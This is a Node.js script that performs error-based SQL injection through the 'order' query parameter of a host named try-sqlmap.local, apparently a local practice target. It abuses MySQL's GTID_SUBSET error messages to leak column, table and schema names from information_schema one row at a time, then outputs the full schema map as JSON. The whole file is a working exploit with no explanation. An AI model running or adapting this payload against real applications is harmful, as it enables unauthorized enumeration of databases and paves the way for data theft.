const ifetch = require('ifetch-node')

const schemas = Object.create(null)

!(async () => {
  let i = 0
  while (true) {
    try {
      const [r1, r2, r3] = await Promise.all([ifetch('http://try-sqlmap.local', {
        raw: `GET /?order=GTID_SUBSET(CONCAT((SELECT+COLUMN_NAME+from+information_schema.COLUMNS+limit+${i},1)),1) HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Connection: close

`
      }).then(r => r.text()), ifetch('http://try-sqlmap.local', {
        raw: `GET /?order=GTID_SUBSET(CONCAT((SELECT+TABLE_NAME+from+information_schema.COLUMNS+limit+${i},1)),1) HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Connection: close

`
      }).then(r => r.text()), ifetch('http://try-sqlmap.local', {
        raw: `GET /?order=GTID_SUBSET(CONCAT((SELECT+TABLE_SCHEMA+from+information_schema.COLUMNS+limit+${i},1)),1) HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Connection: close

`
      }).then(r => r.text())])
      if (~r1.indexOf(`Try sqlmap`) || ~r2.indexOf(`Try sqlmap`) || ~r3.indexOf(`Try sqlmap`)) {
        console.error('Done')
        return
      }
      const column = /^Malformed GTID set specification '(.+?)'\.$/.exec(r1)[1]
      const table = /^Malformed GTID set specification '(.+?)'\.$/.exec(r2)[1]
      const database = /^Malformed GTID set specification '(.+?)'\.$/.exec(r3)[1]
      console.error(column,table,database)
      if (!schemas[database]) schemas[database] = Object.create(null)
      const databaseTables = schemas[database]
      if (!databaseTables[table]) databaseTables[table] = []
      databaseTables[table].push(column)
      i++
    } catch (e) {
      console.error(e)
    }
  }
})().catch(console.error).then(() => {
  console.error(schemas)
  process.stdout.write(JSON.stringify(schemas))
  process.exit(0)
})
